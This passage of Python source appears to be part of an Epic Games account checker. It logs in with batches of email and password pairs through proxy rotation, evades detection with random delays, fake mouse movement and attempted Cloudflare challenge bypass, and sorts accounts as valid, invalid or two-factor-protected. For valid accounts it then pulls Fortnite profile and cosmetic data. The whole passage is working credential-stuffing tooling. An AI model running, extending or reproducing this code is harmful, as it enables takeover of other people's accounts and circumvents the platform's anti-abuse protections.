                    cosmetic_patterns = [
                        r'"cosmetic[^"]*":"([^"]+)"',
                        r'"skin[^"]*":"([^"]+)"',
                        r'"outfit[^"]*":"([^"]+)"',
                        r'"backbling[^"]*":"([^"]+)"',
                        r'"pickaxe[^"]*":"([^"]+)"',
                        r'"glider[^"]*":"([^"]+)"'
                    ]
                    
                    found_cosmetics = []
                    for pattern in cosmetic_patterns:
                        matches = re.findall(pattern, page_content, re.IGNORECASE)
                        found_cosmetics.extend(matches)
                    
                    if found_cosmetics:
                        # Remove duplicates and filter
                        unique_cosmetics = list(set([c for c in found_cosmetics if len(c) > 3 and len(c) < 50]))
                        if unique_cosmetics:
                            fortnite_data['detected_cosmetics'] = unique_cosmetics[:20]  # Limit to 20
                            fortnite_data['total_cosmetics'] = len(unique_cosmetics)
                            
            except Exception as cosmetics_error:
                print(f"⚠️ {email} - Error extracting cosmetics: {cosmetics_error}")
            
            return fortnite_data
            
        except Exception as e:
            print(f"❌ {email} - Error in Fortnite data extraction: {e}")
            return {}
    
    async def _fetch_profile_via_browser(self, page: Page, account_id: str, email: str) -> Dict[str, Any]:
        """Fetch profile data using browser's authenticated session"""
        try:
            profile_data = {}
            
            # Try to make API calls using the browser's fetch API
            api_result = await page.evaluate(f"""
                async () => {{
                    try {{
                        // Try to fetch basic account info
                        const accountResponse = await fetch('/account/api/public/account', {{
                            credentials: 'include',
                            headers: {{
                                'Content-Type': 'application/json'
                            }}
                        }});
                        
                        let result = {{}};
                        
                        if (accountResponse.ok) {{
                            const accountData = await accountResponse.json();
                            result.account_info = {{
                                display_name: accountData.displayName,
                                email_verified: accountData.emailVerified,
                                cabined: accountData.cabined
                            }};
                        }}
                        
                        // Try to fetch Fortnite-specific data
                        try {{
                            const fortniteResponse = await fetch(`https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile`, {{
                                method: 'POST',
                                credentials: 'include',
                                headers: {{
                                    'Content-Type': 'application/json'
                                }},
                                body: JSON.stringify({{
                                    profileId: 'athena',
                                    rvn: -1
                                }})
                            }});
                            
                            if (fortniteResponse.ok) {{
                                const fortniteData = await fortniteResponse.json();
                                result.fortnite_profile = fortniteData;
                            }}
                        }} catch (fortniteError) {{
                            result.fortnite_error = fortniteError.message;
                        }}
                        
                        return {{ success: true, data: result }};
                        
                    }} catch (error) {{
                        return {{ success: false, error: error.message }};
                    }}
                }}
            """)
            
            if api_result.get('success') and api_result.get('data'):
                data = api_result['data']
                
                # Process account info
                if 'account_info' in data:
                    profile_data.update(data['account_info'])
                
                # Process Fortnite profile data
                if 'fortnite_profile' in data:
                    fortnite_profile = data['fortnite_profile']
                    
                    # Parse the profile data using existing methods
                    try:
                        if 'profileChanges' in fortnite_profile:
                            athena_data = self._parse_athena_profile(fortnite_profile)
                            profile_data.update(athena_data)
                            print(f"✅ {email} - Successfully parsed Fortnite profile data")
                    except Exception as parse_error:
                        print(f"⚠️ {email} - Error parsing Fortnite profile: {parse_error}")
            
            return profile_data
            
        except Exception as e:
            print(f"❌ {email} - Error fetching profile via browser: {e}")
            return {}
    
    async def _fetch_details_via_cookies_legacy(self, page: Page, email: str) -> Dict[str, Any]:
        """
        Legacy method - kept for compatibility
        """
        try:
            cookies = await page.context.cookies()
            cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
            return {
                'message': 'Login successful but detailed info unavailable',
                'login_method': 'browser_session',
                'cookies_available': len(cookie_dict) > 0
            }
        except Exception as e:
            print(f"❌ {email} - Error with cookie-based extraction: {str(e)}")
            return {'profile_error': f'Cookie extraction failed: {str(e)}'}
    
    async def check_account(self, email: str, password: str, proxy: str = None) -> Tuple[AccountStatus, Dict[str, Any]]:
        """Optimized Epic Games account checking with enhanced performance"""
        async with self.semaphore:
            print(f"🔍 Checking Epic Games account: {email}")
            
            # Optimized proxy selection
            if proxy:
                print(f"🌐 {email} - Using provided proxy: {proxy[:20]}...")
                proxy_str = proxy
            else:
                proxy_str = self.get_proxy_for_check()
                if proxy_str:
                    print(f"🌐 {email} - Using pool proxy: {proxy_str[:20]}...")
                else:
                    print(f"🚫 {email} - No proxies uploaded, using direct connection")
            
            # Increment check counter for cleanup
            self.checks_performed += 1
            
            context = None
            try:
                # Get or launch browser with optimized pooling
                browser = await self.get_or_launch_browser(proxy_str)
                proxy_key = proxy_str or "__noproxy__"
                
                # Use optimized context with reuse
                context = await self.get_optimized_context(browser, proxy_key)
                page = await context.new_page()
                
                # Set timeouts
                page.set_default_navigation_timeout(NAVIGATION_TIMEOUT)
                page.set_default_timeout(NAVIGATION_TIMEOUT)
                
                # Setup resource blocking
                await self.setup_page_blocking(page)
                
                # Navigate to login page with human-like behavior
                print(f"🌐 {email} - Navigating to login page...")
                
                # Add longer random delay before navigation for stealth (3-8 seconds)
                await asyncio.sleep(random.uniform(3, 8))
                
                # Navigate with proper wait conditions
                await page.goto(LOGIN_URL, wait_until="networkidle", timeout=45000)
                
                # Human-like mouse movement with multiple movements
                for _ in range(random.randint(2, 4)):
                    await page.mouse.move(random.randint(100, 800), random.randint(100, 600))
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                
                # Wait for page to fully load with longer random timing
                await asyncio.sleep(random.uniform(5, 12))
                
                # Enhanced Cloudflare bypass attempt
                try:
                    # Wait for potential Cloudflare challenge to appear and resolve
                    print(f"🔍 {email} - Checking for security challenges...")
                    
                    # First, try to immediately handle any visible challenges
                    challenge_handled = await self.handle_cloudflare_challenge(page, email)
                    if challenge_handled:
                        print(f"🎉 {email} - Initial challenge handled successfully!")
                        await asyncio.sleep(random.uniform(2, 4))
                    
                    # Check for Cloudflare challenge indicators
                    cf_indicators = [
                        "input[name='cf-turnstile-response']",  # Turnstile
                        ".cf-challenge-container",              # Challenge container
                        ".cf-challenge",                        # Challenge section
                        "iframe[src*='challenges.cloudflare.com']",  # Challenge iframe
                        "title:has-text('Just a moment')",     # Cloudflare page title
                        "h1:has-text('One more step')",        # Cloudflare heading
                        "text=Please complete a security check", # Cloudflare text
                        "text=Checking your browser",          # Browser check text
                        ".lds-ring"                             # Loading spinner
                    ]
                    
                    challenge_detected = False
                    for selector in cf_indicators:
                        try:
                            count = await page.locator(selector).count()
                            if count > 0:
                                print(f"🤖 {email} - Security challenge detected ({selector}), attempting bypass...")
                                challenge_detected = True
                                break
                        except:
                            continue
                    
                    # If challenge detected, wait for it to resolve
                    if challenge_detected:
                        print(f"⏳ {email} - Waiting for challenge to resolve...")
                        
                        challenge_resolved = False
                        # Wait up to 45 seconds for challenge to resolve
                        for attempt in range(45):
                            await asyncio.sleep(1)
                            
                            # Check page title first
                            try:
                                title = await page.title()
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                                    challenge_resolved = True
                                    print(f"✅ {email} - Challenge resolved (title check)!")
                                    break
                            except:
                                pass
                            
                            # Check if we're now on the login page
                            current_url = page.url.lower()
                            if 'login' in current_url and 'epicgames.com' in current_url:
                                # Double check title to make sure
                                try:
                                    title = await page.title()
                                    if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                        challenge_resolved = True
                                        print(f"✅ {email} - Challenge bypassed successfully!")
                                        break
                                except:
                                    pass
                            
                            # Check if challenge elements are still present
                            still_challenged = False
                            for selector in cf_indicators[:3]:  # Check only main indicators
                                try:
                                    if await page.locator(selector).count() > 0:
                                        still_challenged = True
                                        break
                                except:
                                    continue
                            
                            if not still_challenged:
                                challenge_resolved = True
                                print(f"✅ {email} - Challenge resolved (element check)!")
                                break
                            
                            # Try to interact with Cloudflare challenge
                            try:
                                await self.handle_cloudflare_challenge(page, email)
                            except Exception as cf_error:
                                print(f"⚠️ {email} - Error handling Cloudflare challenge: {cf_error}")
                                pass
                        
                        if not challenge_resolved:
                            # Challenge didn't resolve in time
                            print(f"❌ {email} - Challenge timeout after 45 seconds")
                            return AccountStatus.CAPTCHA, {'error': 'Security challenge timeout'}
                    
                    # Additional wait for page stabilization
                    await asyncio.sleep(random.uniform(2, 4))
                    
                    # Final check for any remaining challenge indicators
                    try:
                        title = await page.title()
                        current_url = page.url.lower()
                        
                        if any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                            print(f"🤖 {email} - Persistent challenge in title: {title}")
                            return AccountStatus.CAPTCHA, {'error': f'Persistent security challenge: {title}'}
                        
                        if any(indicator in current_url for indicator in ['challenge', 'captcha', 'verify']):
                            print(f"🤖 {email} - Challenge detected in URL: {current_url}")
                            return AccountStatus.CAPTCHA, {'error': 'Challenge page detected'}
                            
                    except:
                        pass
                        
                except Exception as e:
                    print(f"⚠️ {email} - Error checking for challenges: {e}")
                    pass
                
                # Handle cookie consent if present
                cookie_selectors = [
                    "text=/Accept All/i",
                    "text=/Accept All Cookies/i",
                    "[data-testid*='accept' i]",
                    "button:has-text('Accept')"
                ]
                await self.click_if_present(page, cookie_selectors)
                
                # Wait a bit for page to stabilize
                await asyncio.sleep(2)
                
                # Fill email - EXACT selectors found from Epic Games login page
                email_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "input#email",                              # Primary ID selector
                    "input[name='email']",                      # Primary name selector  
                    "input[type='email']",                      # Primary type selector
                    "input[autocomplete='username']",           # Autocomplete attribute
                    # Fallback selectors for different Epic Games page variations
                    "input[id='usernameOrEmail']",
                    "input[name='usernameOrEmail']",
                    "input[data-testid='email-input']",
                    "input[data-testid='username-input']",
                    "input[inputmode='email']",
                    # Form-based selectors
                    "form input[type='email']",
                    "form input[name='email']",
                    "#email",
                    # Generic fallbacks
                    "input[placeholder*='Email' i]",
                    "input[aria-label*='email' i]",
                    "input[name='username']",
                    "input[id*='email' i]"
                ]
                
                print(f"📧 {email} - Filling email...")
                if not await self.fill_if_present(page, email_selectors, email):
                    return AccountStatus.ERROR, {'error': 'Could not find email input field'}
                
                # Human-like delay after filling email (2-5 seconds)
                await asyncio.sleep(random.uniform(2, 5))
                
                # Click Continue button if present
                continue_selectors = [
                    "button:has-text('Continue')",
                    "button[type='submit']",
                    "text=Continue"
                ]
                await self.click_if_present(page, continue_selectors)
                
                # Wait longer for potential page change (3-7 seconds)
                await asyncio.sleep(random.uniform(3, 7))
                
                # Fill password - EXACT selectors found from Epic Games login page
                password_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "input#password",                           # Primary ID selector
                    "input[name='password']",                   # Primary name selector
                    "input[type='password']",                   # Primary type selector
                    "input[autocomplete='current-password']",   # Autocomplete attribute
                    # Fallback selectors for different Epic Games page variations
                    "input[data-testid='password-input']",
                    "input[data-testid='password']",
                    "input[data-component='password']",
                    # Form-based selectors
                    "form input[type='password']",
                    "form input[name='password']",
                    "#password",
                    # Generic fallbacks
                    "input[placeholder*='Password' i]",
                    "input[aria-label*='password' i]",
                    "input[id*='password' i]"
                ]
                
                print(f"🔐 {email} - Filling password...")
                if not await self.fill_if_present(page, password_selectors, password):
                    return AccountStatus.ERROR, {'error': 'Could not find password input field'}
                
                # Human-like delay after filling password (2-6 seconds)
                await asyncio.sleep(random.uniform(2, 6))
                
                # Click Sign In/Submit button - EXACT selectors found from Epic Games login page
                submit_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "button#sign-in",                           # Primary ID selector
                    "button[type='submit']",                    # Primary type selector
                    "button:has-text('Continue')",             # Primary text selector
                    # Fallback selectors for different Epic Games page variations
                    "input[type='submit']",
                    "button:has-text('Sign In')",
                    "button:has-text('Log In')",
                    "button:has-text('SIGN IN')",
                    "button:has-text('LOG IN')",
                    "button:has-text('CONTINUE')",
                    # Data attributes Epic Games commonly uses
                    "button[data-testid='login-button']",
                    "button[data-testid='submit-button']",
                    "button[data-testid='sign-in-button']",
                    # ID and class patterns
                    "button#login",
                    "button#submit",
                    "button.login-button",
                    "button.submit-button",
                    # Form-based selectors
                    "form button[type='submit']",
                    "form button:last-child",
                    # Generic patterns
                    "button[id*='login' i]",
                    "button[id*='submit' i]",
                    "button[class*='login' i]",
                    "button[class*='submit' i]",
                    # Regex text matching
                    "text=/Sign in|Log in|Continue/i"
                ]
                
                print(f"🚀 {email} - Submitting login...")
                if not await self.click_if_present(page, submit_selectors):
                    return AccountStatus.ERROR, {'error': 'Could not find submit button'}
                
                # Wait for navigation or result
                try:
                    await page.wait_for_load_state("domcontentloaded", timeout=15000)
                    await asyncio.sleep(3)  # Additional wait for page to stabilize
                except:
                    pass  # Continue even if timeout
                
                # Check current URL and page state
                current_url = page.url
                print(f"🔗 {email} - Current URL: {current_url}")
                
                # Detect outcome and extract auth code if successful
                status, details = await self.detect_outcome_and_extract_auth(page, email)
                
                print(f"✅ {email} - Result: {status.value} - {details.get('message', 'Success')}")
                
                return status, details
                
            except Exception as e:
                print(f"❌ {email} - Error during check: {str(e)}")
                return AccountStatus.ERROR, {'error': str(e)}
            
            finally:
                # Optimized cleanup - don't close context immediately for reuse
                if context:
                    try:
                        # Close all pages in context but keep context for reuse
                        pages = context.pages
                        for page in pages:
                            try:
                                await page.close()
                            except:
                                pass
                    except:
                        pass
                
                # Perform periodic cleanup
                try:
                    await self.cleanup_old_contexts()
                except:
                    pass
    
    async def check_accounts_batch(self, accounts: List[Tuple[str, str]], progress_callback=None) -> Dict[str, List[Tuple[str, str, Dict[str, Any]]]]:
        """Optimized batch account checking with intelligent delays and cleanup"""
        results = {
            'valid': [],
            'invalid': [],
            'captcha': [],
            '2fa': [],
            'error': []
        }
        
        total_accounts = len(accounts)
        completed = 0
        
        # Optimized task execution with intelligent delays
        async def check_with_progress_and_delay(i, account):
            nonlocal completed
            
            email, password = account
            
            # Intelligent delay to avoid detection (faster but still stealthy)
            if i > 0:  # No delay for first account
                if self.single_proxy_mode:
                    # Shorter delays for single proxy (less suspicious)
                    delay = random.uniform(self.min_delay_single, self.max_delay_single)
                else:
                    # Very short delays for multiple proxies
                    delay = random.uniform(self.min_delay_multi, self.max_delay_multi)
                
                if DEBUG_ENHANCED_FEATURES:
                    print(f"⏱️ Intelligent delay: {delay:.1f}s before checking {email}")
                await asyncio.sleep(delay)
            
            try:
                status, profile_info = await self.check_account(email, password)
                
                # Store account with profile info
                account_data = (email, password, profile_info)
                
                if status == AccountStatus.VALID:
                    results['valid'].append(account_data)
                elif status == AccountStatus.INVALID:
                    results['invalid'].append(account_data)
                elif status == AccountStatus.CAPTCHA:
                    results['captcha'].append(account_data)
                elif status == AccountStatus.TWO_FA:
                    results['2fa'].append(account_data)
                else:  # ERROR
                    results['error'].append(account_data)
                
                completed += 1
                
                # Call progress callback if provided
                if progress_callback:
                    await progress_callback(completed, total_accounts)
                
                return status, profile_info
                
            except Exception as e:
                print(f"❌ Batch check error for {email}: {e}")
                results['error'].append((email, password, {'error': str(e)}))
                completed += 1
                
                if progress_callback:
                    await progress_callback(completed, total_accounts)
                
                return AccountStatus.ERROR, {'error': str(e)}
        
        # Create tasks with optimized concurrency
        tasks = [check_with_progress_and_delay(i, account) for i, account in enumerate(accounts)]
        
        try:
            # Execute tasks with controlled concurrency
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            # Final cleanup after batch
            try:
                await self.cleanup_old_contexts(force=True)
                if DEBUG_ENHANCED_FEATURES:
                    print(f"🧹 Final cleanup completed after batch of {total_accounts} accounts")
            except:
                pass
        
        return results
    
    async def close(self):
        """Enhanced cleanup with memory management"""
        # Close all contexts first
        for contexts in self.context_pool.values():
            for context in contexts:
                try:
                    await context.close()
                except:
                    pass
        
        # Clear context pools
        self.context_pool.clear()
        self.context_usage_counter.clear()
        
        # Close browsers
        for browser in self.browser_pool.values():
            try:
                await browser.close()
            except:
                pass
        
        # Clear browser pool
        self.browser_pool.clear()
        
        if self.playwright:
            await self.playwright.stop()
        
        if DEBUG_ENHANCED_FEATURES:
            print("🧹 Enhanced cleanup completed - all resources freed")